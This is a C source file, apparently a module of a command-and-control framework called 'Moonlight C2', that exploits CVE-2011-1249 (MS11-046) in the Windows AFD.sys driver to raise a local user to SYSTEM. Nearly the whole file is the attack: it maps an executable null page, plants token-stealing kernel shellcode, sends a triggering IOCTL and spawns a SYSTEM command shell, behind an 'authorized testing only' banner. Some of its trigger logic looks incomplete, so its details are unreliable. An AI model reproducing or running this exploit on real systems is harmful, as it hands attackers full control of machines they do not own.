/*
 * Moonlight C2 Framework - MS11-046 Exploit Module
 * CVE-2011-1249 - Windows Ancillary Function Driver (AFD.sys) Privilege Escalation
 * Target: Windows XP, Vista, 7, Server 2003/2008
 * Type: Local Privilege Escalation
 * 
 * WARNING: For authorized security testing only
 */

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS (WINAPI *PNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

void print_banner() {
    printf("\n");
    printf("Moonlight C2 - MS11-046 Exploit Module\n");
    printf("CVE-2011-1249 - AFD.sys Privilege Escalation\n");
    printf("For Authorized Penetration Testing Only\n");
    printf("\n");
}

BOOL check_os_version() {
    OSVERSIONINFOA osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
    
    if (!GetVersionExA(&osvi)) {
        return FALSE;
    }
    
    printf("[*] OS Version: %d.%d Build %d\n",
        osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
    
    // Check if vulnerable version
    if (osvi.dwMajorVersion == 5 || // XP, 2003
        (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion <= 1)) { // Vista, 7, 2008
        return TRUE;
    }
    
    printf("[!] OS version may not be vulnerable\n");
    return FALSE;
}

BOOL is_system() {
    HANDLE hToken;
    DWORD dwSize;
    PTOKEN_USER pTokenUser;
    BOOL isSystem = FALSE;
    
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        return FALSE;
    }
    
    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
    pTokenUser = (PTOKEN_USER)malloc(dwSize);
    
    if (pTokenUser && GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
        PSID pSystemSid;
        SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
        
        if (AllocateAndInitializeSid(&ntAuthority, 1,
            SECURITY_LOCAL_SYSTEM_RID,
            0, 0, 0, 0, 0, 0, 0, &pSystemSid)) {
            
            isSystem = EqualSid(pTokenUser->User.Sid, pSystemSid);
            FreeSid(pSystemSid);
        }
    }
    
    if (pTokenUser) free(pTokenUser);
    CloseHandle(hToken);
    
    return isSystem;
}

BOOL exploit_ms11046() {
    printf("[*] Current privilege: %s\n", is_system() ? "SYSTEM" : "User");
    printf("[*] Attempting AFD.sys exploitation...\n");
    
    // Open AFD device
    HANDLE hDevice = CreateFileA("\\\\.\\Afd",
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, 0, NULL);
    
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to open AFD device: %d\n", GetLastError());
        return FALSE;
    }
    
    printf("[+] Opened AFD device\n");
    
    // Allocate null page
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll) {
        CloseHandle(hDevice);
        return FALSE;
    }
    
    PNtAllocateVirtualMemory NtAllocateVirtualMemory = 
        (PNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    
    if (!NtAllocateVirtualMemory) {
        FreeLibrary(hNtdll);
        CloseHandle(hDevice);
        return FALSE;
    }
    
    PVOID baseAddress = (PVOID)0x1;
    SIZE_T regionSize = 0x1000;
    
    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &baseAddress,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (status != 0) {
        printf("[!] Failed to allocate null page: 0x%X\n", status);
        FreeLibrary(hNtdll);
        CloseHandle(hDevice);
        return FALSE;
    }
    
    printf("[+] Allocated null page at 0x%p\n", baseAddress);
    
    // Token stealing shellcode
    unsigned char shellcode[] = 
        "\x60"                              // pushad
        "\x64\xA1\x24\x01\x00\x00"          // mov eax, fs:[KTHREAD_OFFSET]
        "\x8B\x40\x50"                      // mov eax, [eax + EPROCESS_OFFSET]
        "\x89\xC1"                          // mov ecx, eax
        "\x8B\x98\xF8\x00\x00\x00"          // mov ebx, [eax + TOKEN_OFFSET]
        
        // Find SYSTEM process (PID 4)
        "\xBA\x04\x00\x00\x00"              // mov edx, 4
        "\x8B\x80\xB8\x00\x00\x00"          // mov eax, [eax + FLINK_OFFSET]
        "\x2D\xB8\x00\x00\x00"              // sub eax, FLINK_OFFSET
        "\x39\x90\xB4\x00\x00\x00"          // cmp [eax + PID_OFFSET], edx
        "\x75\xED"                          // jnz loop
        
        // Replace token
        "\x8B\x90\xF8\x00\x00\x00"          // mov edx, [eax + TOKEN_OFFSET]
        "\x89\x91\xF8\x00\x00\x00"          // mov [ecx + TOKEN_OFFSET], edx
        
        "\x61"                              // popad
        "\x31\xC0"                          // xor eax, eax
        "\x5D"                              // pop ebp
        "\xC2\x08\x00";                     // ret 8
    
    memcpy(baseAddress, shellcode, sizeof(shellcode) - 1);
    
    printf("[*] Shellcode planted in null page\n");
    printf("[*] Triggering vulnerability via IOCTL...\n");
    
    // Prepare IOCTL buffer
    char ioctl_buffer[0x1000] = {0};
    DWORD bytesReturned = 0;
    
    // Trigger the vulnerability
    BOOL result = DeviceIoControl(
        hDevice,
        0x00012003,  // AFD IOCTL code
        ioctl_buffer,
        sizeof(ioctl_buffer),
        ioctl_buffer,
        sizeof(ioctl_buffer),
        &bytesReturned,
        NULL
    );
    
    if (!result) {
        printf("[!] DeviceIoControl failed: %d\n", GetLastError());
    } else {
        printf("[+] IOCTL sent successfully\n");
    }
    
    Sleep(500);
    
    CloseHandle(hDevice);
    FreeLibrary(hNtdll);
    
    printf("[*] Checking privilege level...\n");
    
    if (is_system()) {
        printf("[+] SUCCESS! Running as SYSTEM\n");
        return TRUE;
    } else {
        printf("[-] Still running as user\n");
        printf("[*] Note: This is a proof-of-concept\n");
        return FALSE;
    }
}

int main(int argc, char* argv[]) {
    print_banner();
    
    if (!check_os_version()) {
        printf("[!] OS version check failed\n");
        return 1;
    }
    
    printf("[*] Starting MS11-046 exploitation\n");
    printf("[!] This requires AFD.sys driver to be loaded\n\n");
    
    if (exploit_ms11046()) {
        printf("\n[+] Exploit successful!\n");
        printf("[*] Spawning SYSTEM shell...\n");
        system("cmd.exe");
        return 0;
    } else {
        printf("\n[!] Exploit failed\n");
        return 1;
    }
}
